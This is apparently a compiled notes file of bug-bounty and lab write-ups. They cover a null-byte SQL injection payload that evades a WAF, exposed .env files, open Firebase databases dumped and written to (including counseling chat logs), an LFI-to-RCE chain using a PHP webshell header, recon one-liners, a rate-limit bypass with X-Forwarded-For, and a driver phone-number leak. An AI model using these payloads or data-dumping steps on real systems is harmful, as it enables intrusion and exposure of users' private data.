![](https://miro.medium.com/v2/resize:fit:700/1*4fQnB4M_-_4J8riP1WUqhQ.png)

Tried to inject null byte between each mysql keyword to confuse their WAF and it worked then after getting the db names i injected the following payload to get all the tables in the admin database

#null_00 

```
f’+/**/UNION+%00seLecT+%00TABLE_NAME,TABLE_schema,NULL,NULL,NULL,NULL+FROM+%00INFORMATION_SCHEMA.tables+WHERE+table_schema=’AdminDB’%23
```

![](https://miro.medium.com/v2/resize:fit:700/1*4u0iN_nkEuV6IIX8yeORvg.png)

---

# The Discovery 🔍

While testing the reports feature, I came across a request responsible for creating **reports** in a project. This request included a **field for the report title**. Naturally, I got curious — what happens if I tweak the payload?

**The Original Request:**

```bash
POST /api/v1/projects/id/reports  
  
{  
  "title": "report name",  
}
```

**The Maliciously Curious Request:**

```bash
POST /api/v1/projects/id/reports  
  
{  
  "title": null,  
}
```

This invalid input here was _“title”: null_, **that no value was set and that was accepted by the backend** without proper validation, creating a **“confused”** state where the system attempted to process a report with no valid title.

**Now The Impact on the users**

- When any user tries to access the **Reports page**, the page attempts to load all reports.
- When the page encounters the **report** with `null` **title**, the frontend fails to handle this unexpected state.
- As a result, the **Reports page fully breaks**, displaying only a blank white screen
- No user can view or manage reports for the affected project.

![](https://miro.medium.com/v2/resize:fit:700/1*86n40JwU3kAlA-LeRHzz0Q.png)

			The blank white screen when open the page :)


![](https://miro.medium.com/v2/resize:fit:700/1*oBnP_ttgMIVVPDzy7rxtoQ.jpeg)


---

### Step 2: Probing Endpoints

To hunt for potential misconfigurations, I used a browser extension recommended by **coffinxp** called **"Endpoint Extractor"**. This handy tool pulled out all links, APIs, and endpoints hidden in their JavaScript files. 📜➡️🔗

While sifting through the extracted links, one particular endpoint stood out:

```bash
/v2/env
```

**Bingo!** This looked _suspiciously_ like it could be referencing an environment configuration file. To test this theory, I decided to run this endpoint across all subdomains using **httpx** with the following flag:

```bash
--path /v2/env
```

I opened the valid URLs, and to my _utter shock_ 😲, the server responded with the **`.env`** **file in plain text**!

### Step 3: Analyzing the Contents

Opening the file revealed a treasure trove of sensitive information:

- 🔐 **Internal diagnostic information**
- 📝 **Logging data and internal endpoints**
- 💳 **API keys for third-party services** like payment gateways and email providers

### ⚠️ Potential Security Impact

The exposure of `.env` files is _no joke_. Here's what could happen if such a file falls into the wrong hands:

1. **Database Compromise** 🛢️ Attackers could gain unauthorized access to the database, leading to **data theft** or **manipulation**.
2. **API Abuse** 🔑 Exposed API keys could allow attackers to abuse third-party services, causing **financial losses** or **reputation damage**.
3. **Service Disruption** 🚫 Internal configurations and endpoints could be exploited to **disrupt services** or conduct further attacks.

### 📩 Reporting the Vulnerability

After verifying the issue, I promptly reported it to the organization via their support email. My report included:

- 🛠️ **The affected endpoint** (`/v2/env`)
- 📝 **A detailed explanation** of the issue and its potential impact
- ✅ **Recommendations** for securing `.env` files

---

## Hack firebase:

#FireBase

use a one-liner command that lists all the JS files by providing a list of domains as an input:

```
cat domains.txt | waybackurls | grep '.js' | httpx -mc 200 >> js.txt
```

I then use Nuclei to find secrets in them with the command:

```
nuclei -l js.txt -t /home/kali/.local/nuclei-templates/http/exposures -o potential_secrets.txt
```

(Note: The path to the template might be different for you.)

I have also seen many hunters using Katana for enumerating the JS files, which is a good alternative too.

**Putting the method into Action**

First let’s talk about our target ,“redacted.com”. It is an online counseling site we’re looking at.


So, I tried the same method on our target, hoping to find something interesting. Unlike many other sites, this one didn’t let me down and I got this:

![](https://miro.medium.com/v2/resize:fit:700/1*lxTN_CbgKQZ5RSP5Gb-ovw.png)

And when I opened the URL, I found these Firebase configuration details :

![](https://miro.medium.com/v2/resize:fit:698/1*JsKm_-0btlnMkRbLJMeahw.png)


**Digging Deeper**

Following my instincts, I again went down my favorite road: RESEARCH! I read some articles, blogs, and even some Twitter tweets.  
Finally, I found something useful. These three resources combined gave me the breakthrough:

>https://hacktricks.boitatech.com.br/pentesting/pentesting-web/buckets/firebase-database

>https://blog.securitybreached.org/2020/02/04/exploiting-insecure-firebase-database-bugbounty/

> https://github.com/tauh33dkhan/Hacking-Insecure-Firebase-Database


![[Pasted image 20250210214807.png]]

Following the steps in the [first resource](https://hacktricks.boitatech.com.br/pentesting/pentesting-web/buckets/firebase-database), I added “/.json” to the end of the Firebase database URL and got this:

![](https://miro.medium.com/v2/resize:fit:700/1*N80caQVM0FMQv03-UFzq9A.png)

				It’s a massive database I guess!!

_another reference for this type of attack:_

> https://medium.com/@gradillagustavo87/how-i-took-over-a-firebase-database-with-10-lines-of-code-75c93f9e3be4

To find a solution to this issue, I read the [Firebase documentation](https://firebase.google.com/docs/database/rest/retrieve-data), and found out that I can use filters to get some portion of the database. After applying them **via GET parameters, I tried to access the URL. It took some time to load though, but then I got this:**

![](https://miro.medium.com/v2/resize:fit:700/1*M5RNTfXZSTS7TBSA3CqXHw.png)

After digging deep at the data, I could hardly believe it. I had the entire chat history of each user of the counseling website!


Then I remembered that the [third resource](https://github.com/tauh33dkhan/Hacking-Insecure-Firebase-Database) mentioned above, explained how to check if we could write to the database. I checked it, and guess what!

![](https://miro.medium.com/v2/resize:fit:700/1*7FGmjmOU_LPu0nf_tiJmcA.png)

		I also had unauthorized permissions to write in it too.

## Report n°2 about Firebase:

> waybackurls TARGET.com | httpx-toolkit -status-code

![](https://miro.medium.com/v2/resize:fit:628/1*9eGxnPJuWXYE98E41v7XNw.png)

					test for all active .js domains


While Waybackurls was printing all indexed domains, I started checking those files and found:

![](https://miro.medium.com/v2/resize:fit:628/1*6NUAeT_xJbYwjkHlyLvzvg.png)

How can we use this info to further exploit the app and show critical impact:

I used this exploit:

> https://github.com/MuhammadKhizerJaved/Insecure-Firebase-Exploit

![](https://miro.medium.com/v2/resize:fit:700/1*SRObI26CqD3sungc6XHxCA.png)

![](https://miro.medium.com/v2/resize:fit:700/1*V3gSByq-vdWjAMJ0Hk1xgA.png)

I can write in the database! If the owner of the Web Application has set the security rules as true for both “read” & “write” — ie:

![](https://miro.medium.com/v2/resize:fit:319/1*qDJgc0IX0963H-h8gsk8fA.png)

An attacker could write/dump the database! In this case, their security settings were true for both read and write. If they had:

read: false  
write: true

I was going to be able to write in the database but not see the .json file that I created.

I decided to go deeper and brute-force the potential .json files!

After half an hour I found contactForm.json and BAAAANG!

![](https://miro.medium.com/v2/resize:fit:700/1*ed_MsMcElOiVH3ws8kP-mg.png)

Over 400 email addresses, phone numbers, addresses, names!

For more info. about Firebase penetration testing:

> https://github.com/tauh33dkhan/Hacking-Insecure-Firebase-Database

---
## 15k$ RCE Through Monitoring Debug Mode

#resources: https://medium.com/@0xold/15k-rce-through-monitoring-debug-mode-4f474d8549d5

#debug_mode
## Discovering the endpoint

During reading one of the javascript files i found an endpoint called ExtraServices so i opened up burp and requested the endpont in burp repeater However the endpoint returned a 404 status code but slightly different from the 404.  **the host is always returning so i thought maybe it is a different host and i started fuzzing the endpoint using ffuf**

![](https://miro.medium.com/v2/resize:fit:627/1*BfTOxgnCQDg79GqnDWdeqg.png)

using the command below:

```
ffuf -c -w <(cat customwordlist.txt ) -u https://company.com/Extraserivce/FUZZ
```

The `<()` syntax, known as process substitution, acts as an input where programs can read from stdin. I often use it when fuzzing targets because it allows me to adjust or modify my wordlist on the fly.

For example, if you find an endpoint like `api/users/:user:id` and you want to dump all user IDs, instead of creating a new file to save all the user IDs and then fuzzing it, you can simply use

> ffuf -c -w <(seq 1 1337) -u [https://company.com/](https://company.com/Extraserivce/FUZZ)api/users/FUZZ

back to the [Extraservice](https://company.com/Extraserivce/FUZZ) endpoint fuzzing this endpoint didn’t yield any
results so i decided to leave it for now then a few hours later i found out that some of the endpoints that were working before now almost all of them return a custom 404 response so i knew the developer had implement a functionality that returns 404 response for some endpoints i knew that because the 404 response was different from the screenshot above so i grabbed one of the endpoints that was working before and addeed a backslash before **the begining of the path \ for example /\purl/test and it returned 200 OK.** so i grabbed the 
**Extraservice** endpoint and added a backslash before it and started fuzzing it again

> ffuf -c -w <(cat customwordlist.txt ) -u [https://company.com/\Extraservice/FUZZ](https://company.com/Extraserivce/FUZZ)

shortly after i recevied a very interesting endpoint with a very interesting name **callAny**

![](https://miro.medium.com/v2/resize:fit:627/1*2yDnI49T-PU6dz9vPgAD2g.png)

Based on the endpoint name and the response i thought that this endpoint was taking a parameter then executing **it inside a call_user_func or eval or any similar function that executes code so i started fuzzing the endpoint for both GET,POST requests params with a couple of values such as**

> FUZZ=phpinfo
> 
> FUZZ=phpinfo()
> 
> FUZZ=phpinfo();

and many more then thought maybe it takes from POST request directly without requests params using something like php://input wrapper

```
so i started trying injecting things like phpinfo <?php phpinfo(); ?> ls etc in the body
```

![](https://miro.medium.com/v2/resize:fit:627/1*HAiFpiFqhX4UcfNLXKPC6Q.png)

and nothing really worked i also tried things like ssrf/lfi but i couldn’t really figure out what was happening on the backend so i gave up on it.

## Monitoring debug mode to figure out what’s happening on the backend

#LFI

A few days later while browsing the website and testing other functionality i received the error below this **is an indicator that the developer turned on debug mode in production since debug mode is enabled if navigated to any endpoint that returns an error** it will show the error details thus i will be able to know whats wrong so i quickly navigated to [Extraservice/](https://company.com/Extraserivce/FUZZ)callany endpoint again however i was too late the developer turned off the debug mode after a few secs.

![](https://miro.medium.com/v2/resize:fit:627/1*mNmE5uxUO2cZ0yLOQ6YZfQ.png)


**an idea sparked to my head why don’t i monitor this endpoint and grab the response if the developer turned on debug mode again? so i decided to monitor the endpoint and check if the response size is different it will send the response details to my discord channel. if you want to learn how to monitor your targets i recommend the video below**


<iframe width="680" height="382" src="https://www.youtube.com/embed/wP3n1JnqtMU" title="Subdomain Tracking Basics with Notify" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


Shortly After i received the following 3 errors on my discord

> Warning: Undefined array key “Model” in redacted on line  
> Warning: Undefined array key “Method” in redacted on line  
> Warning: include_once(Models/): Failed to open stream: No such file or directory in redacted on line


**you probably now know whats happening the developer was taking a param called Model to include a specific Model then uses the method param to trigger a specific function on the included model.**

_Did you spot the vulnerablitiy? it is an lfi! you might think okay you can include any file but still you will get an error because you need a valid file and a valid method otherwise the server will return 500 status again. well… you are partially right

![](https://miro.medium.com/v2/resize:fit:627/1*MfqvlQD4mSlZVjeBh8NT3A.png)

![](https://miro.medium.com/v2/resize:fit:627/1*1_acRfg4kZDlc0TMlEfFVA.png)

Except the fact that the code will trigger the method **after** including the file not before so it doesn’t really matter at this point because **we already achieved an lfi.**

## Escalating the LFI to a remote code execution

one of my favorite/quickest ways to escalate an lfi to rce is through php filter chain from [https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html) but since we can’t control the first part of the file we can’t really use php wrappers so we will have to work a little bit harder. **using the classic methods such as log poisong php session injection, reading proc/self/environ etc didn’t really return any result so i decided to fuzz the web directory looking for clues that may indicate a way to write into the host**

Model=../FUZZ

![](https://miro.medium.com/v2/resize:fit:627/1*vm_3GgBgrae6zIxLFb3q8w.png)

I then recevied 3 results. reading .gitignore revealed some interesting files

![](https://miro.medium.com/v2/resize:fit:627/1*f89jia-RuvWKAG0_MSc_iQ.png)

in particular the log and LOG_Path directories because it is probably going to log some stuff the user can control such as headers/params/path etc

so i decided to fuzz those 2 directories however luckily while fuzzing i forgot to include the log directory so instead of doing

Model=../log/FUZZ.txt

```
i did Model= ../FUZZ.txt
```

and when i looked at the response i found out that content of test.txt stores the entire http request of X-ORIGINAL_URL endpoint

![](https://miro.medium.com/v2/resize:fit:627/1*-eIMOL_eoNo6hrhyuEoa8w.png)

so i requested the path in test.txt file and added a webshell in the header

```php
T: <?php system($_GET[‘cmd-old’]); ?> then executed the ls command as a proof of concept
```

![](https://miro.medium.com/v2/resize:fit:627/1*iEZu61jdlq3uNUpZrV5axA.png)

> hackerone: [https://hackerone.com/0xold](https://hackerone.com/0xold)
> 
> twitter : [https://twitter.com/0x0ld](https://twitter.com/0x0ld)


---

## How to use Notify

## Get quick alerts on Discord (Automation Guide)

> https://github.com/projectdiscovery/notify

- Go-based package developed by ProjectDiscovery, the same team behind the famous tool `nuclei` as well.
- It helps to send all valid findings to a dedicated discord channel (public or private), slack, telegram, Gmail, Microsoft Teams, etc…
- You can integrate this package with any other tool.

## ⚔️Setup for this article

![](https://miro.medium.com/v2/resize:fit:700/1*MjFMouP_Jglrgpa44LWlbg.png)

#### 🗃️Installation of Notify

```bash
go install -v github.com/projectdiscovery/notify/cmd/notify@latest
```

Alternatively,

![None](https://miro.medium.com/v2/resize:fit:700/1*t3PlDUyiH05lNz9u280K3Q.png)


Click on releases

![None](https://miro.medium.com/v2/resize:fit:700/1*vMxwGRhiDNFNZ_tondbLdQ.png)


```bash
sudo su
cd /tmp
wget https://github.com/projectdiscovery/notify/releases/download/v1.0.7/notify_1.0.7_linux_amd64.zip
unzip notify_1.0.7_linux_amd64.zip
mv notify /usr/bin/
```

![None](https://miro.medium.com/v2/resize:fit:700/1*yNFZEfJupRChoGwJs9RoTQ.png)

Linux Terminal Screenshot by Author

- Make a new Server on Discord

![None](https://miro.medium.com/v2/resize:fit:700/1*N0SRY_g1HmRwle4A9DsQLQ.png)

![None](https://miro.medium.com/v2/resize:fit:700/1*2a9-PqY0O8WcIY2MO6QPMg.png)

![None](https://miro.medium.com/v2/resize:fit:700/1*W-DozS4GZRT2SWuGWECKWg.png)

- Now remove the default channels and category `text` & `voice`

![None](https://miro.medium.com/v2/resize:fit:700/1*4p5uzgQ-epEP9pto-AFTNw.png)

![None](https://miro.medium.com/v2/resize:fit:700/1*XiHuXditS1rJ-5pA7_lZvQ.png)

- Create a channel under this newly created server

![None](https://miro.medium.com/v2/resize:fit:700/1*3EdfANmwMFegk_JokMIsTA.png)

- Name your channel anything like `nuclei_bot` for example, and click enable the private channel option.

![None](https://miro.medium.com/v2/resize:fit:700/1*OXyZaVhYVt-4jwkTxBPwmw.png)

- Go to privacy settings of this server `bughunt` and disable all DMs and activities

![None](https://miro.medium.com/v2/resize:fit:700/1*3ZBZ19G41Svy1buhTDuNYg.png)

- Now click on the channel settings.

![None](https://miro.medium.com/v2/resize:fit:700/1*tVFgbqHQj_HcL8f9F_HBzw.png)

- Go to `Integrations`

![None](https://miro.medium.com/v2/resize:fit:700/1*ezwFtYMIMwIx-0XgM-V3hg.png)

- Click on `Create Webhook`

![None](https://miro.medium.com/v2/resize:fit:700/1*PjrEiiGE96w_134YYjvkTQ.png)

- A default bot named `Spidey Bot` will be visible, click on it and change the name to anything you wish, `nuclei_notify` in my case and then click on `Save Changes`

![None](https://miro.medium.com/v2/resize:fit:700/1*SKP3VMD6qTENesZ6YQv4Tw.png)

- Copy this webhook URL and save it for later.
- Now we need to create config file for `notify`

```
mkdir -p "$HOME/.config/notify" && touch "$HOME/.config/notify/provider-config.yaml"
```

![None](https://miro.medium.com/v2/resize:fit:700/1*Ii2fa-zVkw4V6N7NoD3knw.png)


Ignore `config.yaml` here as I was testing for something else, open the `provider-config.yaml` file using any editor, easy one like `mousepad`


```shell
discord:
  - id: "nuclei_notify"
    discord_channel: "nuclei_bot"
    discord_username: "enter_your_discord_username"
    discord_format: "{{data}}"
    discord_webhook_url: "https://discord.com/api/webhooks/XXXXXXXX"
```

![None](https://miro.medium.com/v2/resize:fit:700/1*jDdDZc-ueBrGBDZ8cOBW1w.png)


> Not showing using `nano` and `vim` editors to make it easy for beginners.

- Now save the file and let's run `nuclei` now.

#### 🛠️Execution

Here I am running nuclei to search for reflected user inputs without sanitization, same what I discussed in below article.

[Find RXSS Using Nuclei](https://cybersecuritywriteups.com/find-rxss-using-nuclei-dast-87080542adde)


```shell
nuclei -l urls.txt -t /home/kali/.local/nuclei-templates/dast/vulnerabilities/xss/ -dast | notify -id "nuclei_notify"
```

> Don't make a mistake in the `id` here, the same as what you wrote in the `provider-config.yaml` file.

![None](https://miro.medium.com/v2/resize:fit:700/1*zSbWnj7r8gUqmPSZ4Z55ng.png)

#### 🚨Discord Alert

![None](https://miro.medium.com/v2/resize:fit:700/1*1xhbJc4Ztu-QFFfX1I4R_Q.png)

				Discord Alert Screenshot by Author

> It is best for guys that have VPS(Virtual Private Server)🫠

Next part, I will discuss how to customize `xss_vibes` tool and integrate it with `notify`

list: https://medium.com/@abhirupkonwar04/lists

---

# A Few PortSwigger Labs:

## Authentication part-5 : Username enumeration via response timing

by: https://medium.com/@AhmadSopyan/authentication-part-5-username-enumeration-via-response-timing-9b362f24393e

This lab has a **username enumeration vulnerability** using a time response. To solve this lab, we are asked to enumerate to find a valid username, then bruteforce the password. Then access the accout.

We are also given a hint, which is :

This lab implements Anti-BruteForce protection via Ip based. However, this can be easily bypassed by manipulating the **HTTP Request header.**

When I accessed the lab and visited the login page and tried to login using an arbitrary credential, the response from the lab was “**Invalid username or password.**”

![](https://miro.medium.com/v2/resize:fit:788/1*D_pAMgA_sIGhJ_LSHTteRQ.png)

when I look at the request details in the previous step. The time taken when we tried to enter the wrong username and password was **193 mills**.

![](https://miro.medium.com/v2/resize:fit:788/1*qRro-64C-v0J_SEW_RO3qA.png)

Then when I tried to change the username to wiener with the password for now, the response time from the server was **225 mills**. It seemed the same to me.

![](https://miro.medium.com/v2/resize:fit:788/1*kP52QNEPjY6c5LnAoweK4w.png)


When I try for the third time, we get a different response which is :

```
You have made too many incorrect login attempts. Please try again in 30 minute(s).
```

From this response, all we have to do before we get to the exploitation stage is bypass the Rate-Limiting security.

The instructions provided mention that by performing simple manipulations on the HTTP request header, this brute force protection can be overcome.

#_404 

Based on the reference below: https://medium.com/r3d-buck3t/bypass-ip-restrictions-with-burp-suite-fb4c72ec8e9c

Adding an **X-Forwarded-For** header with a random value will allow additional login attempts.

Example:

```
X-Forwarded-For : 123
```

![](https://miro.medium.com/v2/resize:fit:788/1*EmNhoUZdKeHBXpfynOBzpw.png)

In the above experiment, after I added 1 parameter as we discussed earlier. **We successfully bypassed the Rate-Limiting security mechanism of the application.**

From here we will proceed to identify the behavior of the application.

![](https://miro.medium.com/v2/resize:fit:788/1*119EPzqIEeT7EWDCAbufqQ.png)

_When I added a random string of 200 characters in the password parameter and combined it with the correct username, the server took about **1,172 mills** to respond to our request.

you can use this simple script to create the same random string as the experiment above:

```python
# import lib  
import string  
import random  
  
# string length  
length = 200  
  
# characters that will be used  
characters = string.ascii_letters + string.digits  
  
# random string  
random_string = ''.join(random.choices(characters, k=length))  
  
# display output  
print(f"Random String {length} karakter: ")  
print(random_string)
```

![](https://miro.medium.com/v2/resize:fit:788/1*wSCklzKuFxcePdgZIR7nVA.png)

## However, why require a long string in the password parameter ?

The addition of 200 characters to the password field aims to overload the authentication process, resulting in a difference in response time between valid and invalid usernames.

This helps identify valid users through response timing techniques, especially when the server tries to equalize response times as protection. This technique is effective for exposing internal processes that only occur if the username is correct.

**because we already know the behavior of the application. Now we try to brut-force the username to find valid users using intruder burp.**

![](https://miro.medium.com/v2/resize:fit:788/1*_APadugnGf9-QhalGWNMog.png)

Image 1.9 ‘**config intruder pt1**’

![](https://miro.medium.com/v2/resize:fit:788/1*psD-lsTD5wFuI7qfJxe6Jw.png)

Image 2.0 ‘**config intruder pt2**’

In image 2.0, we copy the wordlist that the lab has provided to **Brute-force the username:**

> https://portswigger.net/web-security/authentication/auth-lab-usernames

![[Pasted image 20250702091838.png]]

Of the many requests, we get 1 user where the server takes longer than other users. we note it first.

```
username: ak
```

Now, we try to brute-force the password.

For the candidate password, we can copy the link below:

> https://portswigger.net/web-security/authentication/auth-lab-passwords

![](https://miro.medium.com/v2/resize:fit:788/1*AXq1D5fvkwQH7u_81JV-8Q.png)


_The bruteForce Method is the same_

And sure enough, we get 1 request with a different status_code than the other requests, which is : 302

```
password: abc123
```

![](https://miro.medium.com/v2/resize:fit:788/1*3Y-om2ZJD5HU9Gre_Wi2nA.png)

_If I try to login using the credentials that we got earlier. **We can successfully login as user ak and finish the lab ;)**

## How to Mitigate it ?

1. Equalize response time

Make sure the system provides consistent response times for all username/password combinations, regardless of whether the data is valid or not.

2. Use ambiguous error messages

Instead of giving a message like :

```
“Username not found”
```

use :

```
“Username or password wrong”
```



> Next writeup?  https://infosecwriteups.com/day-7-reflected-xss-into-attribute-with-angle-brackets-html-encoded-zero-to-hero-series-8b0c775fc7b5

<<>><<>><<>><<>><<>><<>><<>><<>><<>><<>><<>><<>><<>><<>><<>>
# The easiest $2500 I got it from bug bounty program
## How I found the vulnerability?

One day, my friend came to me to request a trip for his friend, when the driver arrived I wanted to give the driver number to my friend to give it to his friend to communicate with the driver, at that time I knew that Uber protects the numbers of drivers and customers, but I am a curious person so I clicked here and there until I found a new feature It allows you to send SMS to the driver. **When I clicked on it, it was the surprising, the driver’s real number appeared to me. I gave the number to my friend to send it to his friend. Then I thought about what had happened, and I thought to myself that this was unusual behavior and thought it was a vulnerability!!**

## **How to reproduce the vulnerability?**

At first, request a trip. After that, press the location of the arrow indicated in the picture below, in order to have a conversation with the driver.

![](https://miro.medium.com/v2/resize:fit:627/1*kwy0hU9IPNhL6EToffKdrg.png)

After that, click on the phone sign above, and two options will appear for you, the first is make a phone call with driver (if you click it, it will direct you to the Uber general number and you will not know the real driver’s number).

![](https://miro.medium.com/v2/resize:fit:627/1*QpCFr09BQ3GDoQhcWHdeSw.png)

**The second option is to send a SMS to the driver and when you click on it, the real driver’s number will appear for you.**

![](https://miro.medium.com/v2/resize:fit:627/1*Fhj0N3x_rNijd0IBHUpIVw.png)

## How did I report the vulnerability?

I searched for Uber in [**hackerone**](https://hackerone.com/) and found that they have a program, **I tried to send a report, but I could not, because my account is new and I do not have any signals, I contacted with hackerone’s support, but to no avail as well.** I searched on Facebook and found a person called [**Khaled Hassan**](https://www.facebook.com/KhaledAzrail) and he is a security researcher a long time ago and I decided to send the vulnerability to him in order to send it on my behalf (I never knew him at the time, but now he is one of my best friend).

The vulnerability was fixed a month after it was send, and I was awarded my first bounty.

![](https://miro.medium.com/v2/resize:fit:627/1*FLFdfJC9aU0aVzckKMVj2w.png)

---
